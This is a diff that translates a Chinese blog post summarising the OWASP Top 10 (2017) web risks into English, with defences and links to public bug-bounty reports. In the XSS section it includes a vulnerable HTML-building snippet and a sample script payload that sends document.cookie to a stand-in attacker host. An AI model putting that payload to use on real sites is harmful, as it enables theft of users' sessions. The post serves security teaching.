@@ -1,151 +1,158 @@
 ---
-title: "OWASP TOP 10(2017)"
-date: 2019-09-21T17:21:11+11:00
-summary: 《OWASP Top 10 - 2017 The Ten Most Critical Web Application Security Risks》总结了Web应用程序最可能、最常见、最危险的十大漏洞。虽然离报告发布已经过去了两年，但是这份报告对web安全介绍还是十分有意义的。尤其是对于刚入门web安全的工程师来说，这份报告是一个非常好的指南，可以帮助IT公司和开发团队规范应用程序开发流程和测试流程，提高Web产品的安全性。本文将会根据这些漏洞类型，进行分类分析，并提出一些我个人的看法。最后会根据这套报告，对一些网站进行测试。
+Title: "OWASP TOP 10(2017)"
+Date: 2019-09-21T17:21:11+11:00
+Summary: "OWASP Top 10 - 2017 The Ten Most Critical Web Application Security Risks" summarizes the ten most likely, common, and dangerous vulnerabilities in web applications. Although it has been two years since the report was released, it is still very meaningful for introducing web security. Especially for engineers who are new to web security, this report is a very good guide that can help IT companies and development teams standardize the application development process and testing process, and improve the security of web products. This article will classify and analyze these vulnerability types and provide some of my personal opinions. 
 draft: false
 ---
 
-[OWASP Top 10 - 2017 The Ten Most Critical Web Application Security Risks](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)总结了Web应用程序最可能、最常见、最危险的十大漏洞。虽然离报告发布已经过去了两年，但是这份报告对web安全介绍还是十分有意义的。尤其是对于刚入门web安全的工程师来说，这份报告是一个非常好的指南，可以帮助IT公司和开发团队规范应用程序开发流程和测试流程，提高Web产品的安全性。本文将会根据这些漏洞类型，进行分类分析，并提出一些我个人的看法。最后会根据这套报告，对一些网站进行测试。
 
-## 第一类：没有对用户输入进行验证
+[OWASP Top 10 - 2017 The Ten Most Critical Web Application Security Risks](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf) summarizes the ten most likely, common, and dangerous vulnerabilities in web applications. Although it has been two years since the report was released, it is still very meaningful for introducing web security. Especially for engineers who are new to web security, this report is a very good guide that can help IT companies and development teams standardize the application development process and testing process, and improve the security of web products. This article will classify and analyze these vulnerability types and provide some of my personal opinions. 
 
-### A1 : 注入
+## Category 1: No User Input Validation
 
-在web安全中，注入是最常见也往往是影响最大的漏洞。他包括SQL、NoSQL、OS以及LDAP注入等。这些漏洞基本都是因为没有对用户的输入进行验证。其中以对数据库的注入最多。作为web应用，需要依靠许多第三方的服务（比如数据库，缓存，系统调用等等）来实现具体的功能。在web调用这些服务的时候往往是给这些服务发送一些命令，如果不对用户的输入进行验证，用户的输入就很容易的对这些们命令进行修改，达到调用其他命令的目的。
+### A1: Injection
 
-**相关案例**
+In web security, injection is the most common and often the most impactful vulnerability. This includes SQL, NoSQL, OS, and LDAP injection, among others. These vulnerabilities are generally caused by a lack of validation of user input, with database injection being the most common. As a web application, many third-party services (such as databases, caches, system calls, etc.) are relied upon to implement specific functionality. When calling these services in web applications, commands are often sent to these services. If user input is not validated, it is easy for users to modify these commands and achieve the goal of calling other unintended commands.
+
+**Related Cases**
 
 [RCE with Flask Jinja Template Injection](https://medium.com/@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870)
 [H1-4420: From Quiz to Admin - Chaining Two 0-Days to Compromise An Uber Wordpress](https://www.rcesecurity.com/2019/09/H1-4420-From-Quiz-to-Admin-Chaining-Two-0-Days-to-Compromise-an-Uber-Wordpress/)
 
-### A4：XML外部实体漏洞（XXE）
+### A4: XML External Entity Injection (XXE)
 
-这种漏洞主要出现在paring XML时候出了问题。这些漏洞一般出现在一些支持SOAP的web服务，服务器需要对XML格式的请求进行分析。OWASP中对这种漏洞的应对建议是：
-1. 尽量使用简单的JSON请求
-2. 使用安全的XML parser，升级SOAP到SOAP1.2或者更高
-3. 对请求进行验证（如使用白名单等等）
+This vulnerability primarily occurs during parsing of XML. These vulnerabilities typically appear in some web services that support SOAP, where the server needs to analyze requests in XML format. The OWASP recommends the following countermeasures for this vulnerability:
 
-**相关案例**
+Use simple JSON requests whenever possible.
+Use secure XML parsers and upgrade SOAP to SOAP1.2 or higher.
+Validate requests (e.g., using whitelisting).
+
+**Related cases**
 
 [OOB XXE in PrizmDoc (CVE-2018–15805)](https://medium.com/@mrnikhilsri/oob-xxe-in-prizmdoc-cve-2018-15805-dfb1e474345c)
 
-### A7 : 跨站脚本-XSS
+### A7: Cross-site scripting (XSS)
 
-与A1的后端服务注入不同，XSS是对client端网页的注入，攻击对象是以client端为主。常见的XSS注入类型有：
-1. 储存型（注入代码保存到Database）
-2. 反射型（注入代码不保存到后端，直接显示到网页上）
+Unlike A1's backend service injection, XSS is an injection into the client-side web page, with the main target being the client-side. Common types of XSS injection include:
+
+1. Stored XSS (injecting code that is saved to the database).
+2. Reflected XSS (injecting code that is not saved to the backend, but is directly displayed on the webpage).
    ```js=
    (String)page += "<input name='creditcard' type='TEXT' value='" 
    + request.getParameter("CC") + "'>";
-   // 攻击者可以通过修改浏览器中'CC'参数来实现注入,达到窃取cookie的目的
+   // Attackers can inject code by modifying the 'CC' parameter in the browser, 
+   // in order to steal cookies
    <script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?
    foo='+docuement.cookie</script>'
    ```
-3. DOM型（一般都是单页应用中，用户可控数据被注入）
+3. DOM-based XSS (usually occurs in single-page applications where user-controlled data is injected).
 
-OWASP中对这种漏洞的应对建议是：
-1. 使用框架自带的XSS防护，了解所用框架对XSS的防护手段
-2. 对用户可控数据进行验证，去掉危险的符号
-3. 使用CSP
+OWASP's recommended responses to this type of vulnerability include:
+1. Use the XSS protection provided by the framework and understand the framework's XSS protection measures.
+2. Validate user-controlled data and remove dangerous symbols.
+3. Use CSP.
 
-**相关案例**
+**Related Cases**
 
 - [Possibility to inject a malicious JavaScript code in any file on tags.tiqcdn.com results in a stored XSS on any page in most Uber domains](https://hackerone.com/reports/256152)
 - [Reflected XSS POST method at partners.uber.com](https://hackerone.com/reports/129582)
 - [How a classical XSS can lead to persistent ATO Vulnerability?](https://hackademic.co.in/how-a-classical-xss-can-lead-to-persistent-ato-vulnerability/)
 
-### A8：不安全的反序列化漏洞
+### A8: Insecure Deserialization Vulnerability
 
-这种漏洞和XXE有些类似。反序列化是一个从字符到内存对象的转化过程。中间涉及到parsing, 并会在内存中构造对象。几乎像一个简化般的解释器在解释代码。可想而知中间会出现多少问题。OWASP中对这种漏洞的应对建议：
+This type of vulnerability is similar to XXE (XML External Entity) attacks. Deserialization is a process of converting data from a string to an object in memory. It involves parsing and constructing objects in memory, almost like a simplified interpreter interpreting code. As you can imagine, many problems can occur during this process. The following are the recommended countermeasures for this vulnerability according to OWASP:
 
-1. 尽量不要接受外部的序列化对象，或者只接受原始数据类型的序列化对象。
-2. 如果以上无法做到，可以考虑以下方法：
-    - 使用数字签名进行完整性检验
-    - 反序列化之后，进行严格的类型检查
-    - 把反序列化的工作隔离开来并运行在低权限环境中
-    - 记录反序列化异常
-    - 限制并记录那些传输反序列化的容器或服务器
-    - 监控反序列化，对经常调用反序列化的用户进行预警
+1. Avoid accepting serialized objects from external sources or only accept serialized objects of primitive data types.
+2. If the above is not possible, consider the following methods:
+    - Use digital signatures for integrity checking.
+    - Perform strict type checking after deserialization.
+    - Isolate the deserialization process and run it in a low-privileged environment.
+    - Record deserialization exceptions.
+    - Limit and record the containers or servers that transmit deserialization.
+    - Monitor deserialization and alert users who frequently call deserialization.
 
-**相关案例**
+**Related Cases**
 
 - [RCE and Complete Server Takeover of http://www.***.starbucks.com.sg/](https://hackerone.com/reports/502758)
 - [Lack of payment type validation in dial.uber.com allows for free rides](https://hackerone.com/reports/162199)
 
-## 第二类： 获得非法信息/功能的成本过低
+## Category 2: The cost of obtaining illegal information/function is too low
 
-### A2 : 失效的身份认证和会话管理
+### A2: Invalid Identity Authentication and Session Management
 
-身份认证是web服务中非常重要，也是最基本的一个功能。但是要把这块做好其实没有想象中那么容易。连Instagram在前不久都出现了认证方面的漏洞。根据OWASP，常见的身份认证的漏洞有：
-1. 允许攻击者对大量帐号进行自动登录测试
-2. 允许攻击者对某个帐号进行自动的穷举登录测试
-3. 在URL中暴露session id
-4. session id没有更换或者失效
+Identity authentication is a very important and basic function in web services. However, it is not as easy to do well as one might think. Even Instagram recently had vulnerabilities in authentication. According to OWASP, common vulnerabilities in identity authentication include:
 
-这些漏洞都有一个共同的特点，信息泄漏的门槛太低。换句话说，攻击者可以以相对较低的成本获得相应的用户（登录）信息。常见防御的手段是：
+1. Allowing attackers to automatically log in to a large number of accounts for testing
+2. Allowing attackers to automatically exhaustively test a single account's login credentials
+3. Exposing session IDs in URLs
+4. Session IDs not being changed or invalidated
 
-1. 尽可能使用多重验证（MFA）
-2. 不要使用初始的简单的密码，尤其是对于admin账户
-3. 不让user创建简单的密码，提高安全性
-4. 提高攻击者对用户帐号进行暴力破解的成本（比如增加验证码，增加登录出错后要等待的功能）
-5. 定期对sessioin id进行更换
+These vulnerabilities all have a common characteristic: the threshold for information leakage is too low. In other words, attackers can obtain corresponding user (login) information at relatively low cost. Common defense measures include:
 
-其实不只是登录穷举的问题，还有验证码穷举，总之涉及验证的功能都要有防止穷举的措施。
+1. Using multi-factor authentication (MFA) as much as possible
+2. Not using simple initial passwords, especially for admin accounts
+3. Not allowing users to create simple passwords to improve security
+4. Increasing the cost for attackers to brute-force user accounts (such as adding CAPTCHAs, adding features to wait after failed logins)
+5. Regularly changing session IDs
 
-### A3 : 敏感信息泄露
+It's not just a problem with login credential guessing, but also with CAPTCHA guessing. In short, any function related to verification should have measures to prevent exhaustive attacks.
 
-这类漏洞主要和信息保存和传输相关。根据OWASP，没有https加密的传输，在DB中的敏感资料（如密码）不进行加密，或者加密过弱等等都是导致漏洞的原因。
+### A3: Sensitive information leakage
 
-这里我想补充一个我在其他地方看到的一个例子。A网站是一个股票公告发布的网站，所有上市交易公司的公告都要通过这个网站定时向外发布。A君是负责检阅并发布公司公告的负责人。因为每天需要发布的公告太多，A君习惯先把公告保存到网站上（此时链接已经生成，只是没有公开），然后到时间在把文章的link更新网站的页面上，这样所有人可以根据这个公开link访问dao公告。B君是一个股票交易员，他发现公告的link都是有规律的，而且他还发现很多时候链接还没有公开就已经可以访问。于是他写了一个脚本，对这些已经生成链接但是还没有公开的公告进行下载（循环穷举）。这样他就可以比市场提前一步获得股票的最新信息，从而获得巨大的信息优势。
+This type of vulnerability is mainly related to information storage and transmission. According to OWASP, vulnerabilities can occur when sensitive data (such as passwords) stored in a database is not encrypted, or is encrypted with weak encryption algorithms, especially when transmitted without HTTPS encryption.
 
-**相关案例**
+Here, I would like to add an example I saw elsewhere. Website A is a stock announcement publishing website, and all announcements of listed trading companies must be published through this website on a regular basis. Mr. A is responsible for reviewing and publishing the company announcements. Because there are too many announcements to be published every day, Mr. A is accustomed to saving the announcements on the website first (at this point, the links have been generated but are not public), and then updating the link of the article on the website page at the scheduled time, so that everyone can access the announcement according to the public link. Mr. B is a stock trader who found that the links to the announcements were structured and that the links were accessible even before they were made public. So he wrote a script to download the announcements that had already generated links but had not yet been made public. This way, he could gain a huge information advantage by getting the latest stock information before the market, thereby gaining an edge.
+
+**Related case**
 - [Client secret, server tokens for developer applications returned by internal API](https://hackerone.com/reports/419655)
 
-### A5 : 缺少功能级访问控制
+### A5: Lack of Function Level Access Control
 
-根据OWASP，对用户的错误访问控制是一个比较常见的漏洞。因为缺少自动的权限测试，很多时候还是手动测试为主。对此OWASP的建议是，所有权限校验和访问控制都必须是后端完成，而且要对用户的输入进行严格的检验。
+According to OWASP, incorrect access control by users is a common vulnerability. Since there is a lack of automated permission testing, manual testing is often necessary. OWASP recommends that all permission verification and access control must be done on the backend and that user input must be strictly validated.
 
-**相关案例**
+**Related cases**
 - [Change any Uber user's password through /rt/users/passwordless-signup - Account Takeover (critical)](https://hackerone.com/reports/143717)
 - [Shopify Admin -- Permission from Settings to Customer](https://hackerone.com/reports/541606)
 
-### A6 : 配置错误
+### A6: Configuration Error
 
-随着web的发展，各种新技术和工具如雨后春笋般出现。这里面许多工具都涉及到许多配置，尤其是一些默认配置，如果配置不当很容易造成漏洞。根据OWASP，一般有以下几种配置错误的情况：
-1. 没有做好工具的安全配置
-2. 没有禁止默认的帐号和密码
-3. 打开了不需要的功能
-4. 将出错处理的信息返回给攻击者
-5. 使用老旧的有漏洞的软件
+With the development of the web, various new technologies and tools have emerged like bamboo shoots after a spring rain. Many of these tools involve a lot of configuration, especially some default configurations, which can easily cause vulnerabilities if not configured properly. According to OWASP, there are generally several types of configuration errors:
+1. Failure to secure the tool's configuration
+2. Failure to disable default accounts and passwords
+3. Enabling unnecessary functionality
+4. Returning error handling information to attackers
+5. Using outdated and vulnerable software
 
-程序员应该要对自己使用的工具和技术有基本的认识，尤其是相应工具的安全配置，以及可能出现的问题。
+Programmers should have a basic understanding of the tools and technologies they use, especially the security configurations of the corresponding tools and the possible problems that may arise.
 
-**相关案例**
+**Related cases**
 
 - [Nginx misconfiguration leading to direct PHP source code download](https://hackerone.com/reports/268382)
 - [Chained Bugs to Leak Victim's Uber's FB Oauth Token](https://hackerone.com/reports/202781)
 - [Open Redirect on central.uber.com allows for account takeover](https://hackerone.com/reports/206591)
 
-## 第三类： 
+## Category Three:
 
-### A9 : 使用含有已知漏洞的组件
+### A9: Use components with known vulnerabilities
 
-这类漏洞非常常见。基本上某个组件被爆出漏洞（0day），都会有一段时间需要admin打补丁。以前很多都是手动的，但是现在基本都要求自动化，以减少攻击窗口。如果漏洞都发布了好一段时间，甚至连exploit都放出来了，网站都没有打补丁或者跟换组件，那么这个漏洞就迟早被人利用。以bludkeep漏洞为例。这个漏洞2019年3月份公布，前几天更是放出了可以导致code execution的[exploit](https://github.com/rapid7/metasploit-framework/pull/12283), 但是我们通过shodan可以看到仅仅在中国就有20w的服务器没有打补丁。
+This type of vulnerability is very common. Basically, when a component is found to have a vulnerability (0day), there is usually a period of time during which administrators need to patch it. In the past, many patches were applied manually, but now automation is generally required to reduce the attack window. If a vulnerability has been published for a long time, and even an exploit has been released, but the website has not been patched or the component has not been replaced, then the vulnerability will inevitably be exploited sooner or later. Take the bludkeep vulnerability as an example. This vulnerability was disclosed in March 2019, and just a few days ago an exploit that can cause code execution was released (https://github.com/rapid7/metasploit-framework/pull/12283). However, we can see from Shodan that there are still 200,000 servers in China alone that have not been patched.
 
 ![](https://i.imgur.com/myZOqmL.png)
 
-这种漏洞经常会被malware所利用并进行快速传播。那些挖矿，DDOS等malware最喜欢就是这种漏洞。我之前写过一篇关于DDOS的malware分析，有兴趣的可以一看。
+This type of vulnerability is often exploited by malware and spreads quickly. Malware that mines cryptocurrency or carries out DDoS attacks, for example, loves this type of vulnerability. I previously wrote an analysis of malware that carries out DDoS attacks, which may be of interest to some.
 
-### A10：不足的记录和漏洞监控
+### A10: Insufficient logging and monitoring of vulnerabilities
 
-初看起来这好像和漏洞并没有什么关系，因为没有记录和监控并不是直接导致网站被入侵。但仔细想，没有监控和记录确实是很大的安全问题。许多攻击正是因为有监控和记录才得到及时的制止。没有监控，网站被入侵了都不知道，甚至黑客能在公司网络盘踞好几个月而不被发现。如果有了监控和记录，即使网站有漏洞被黑客利用，也能尽快的发现，并最大可能的减少损失。在这方面aws是做的很不错，不仅对外有强大的cloudwatch进行监控，对内则有cloudtrail，既防外敌，也防家贼。
+At first glance, this may not seem related to vulnerabilities, because the lack of logging and monitoring does not directly lead to website breaches. However, upon closer inspection, the lack of monitoring and logging is indeed a significant security issue. Many attacks are stopped in a timely manner precisely because of monitoring and logging. Without monitoring, if a website is breached, it may go unnoticed, and hackers may even be able to stay on a company's network for several months without being detected. With monitoring and logging, even if a website has vulnerabilities that are exploited by hackers, the breach can be discovered as quickly as possible, and the losses can be minimized. 
 
-提到记录和监控，其中还有一种比较特殊的防御机制，叫做蜜罐。简单的讲是部署一个有漏洞的公开服务器，通过记录和监控，观察黑客是如何渗透攻击的。通过观察黑客的攻击手法，从而更好的防御。
+When it comes to logging and monitoring, there is also a special type of defense mechanism called a honeypot. Simply put, a vulnerable public server is deployed and observed through logging and monitoring to see how hackers penetrate and attack. By observing hackers' attack methods, better defense can be achieved.
 
 ## Summary
 
-1. 识别收集可能的攻击点（attack surface）
-    - 识别网站的功能，以及相应需要的资源
-3. 考虑攻击点背后可能涉及到的技术（比如是否需要查询DB等等）
-4. 考虑攻击点背后的可能的实现路径（包括异常处理的路径）
+I think there are some measures that can be taken to mitigate these security issues.
+
+1. Identify and collect possible attack points (attack surface)
+2. Identify the functions of the website and the corresponding resources needed
+3. Consider the technology involved behind the attack surface (such as whether it requires querying a database, etc.)
+4. Consider the possible implementation paths behind the attack surface (including exception handling paths).
 
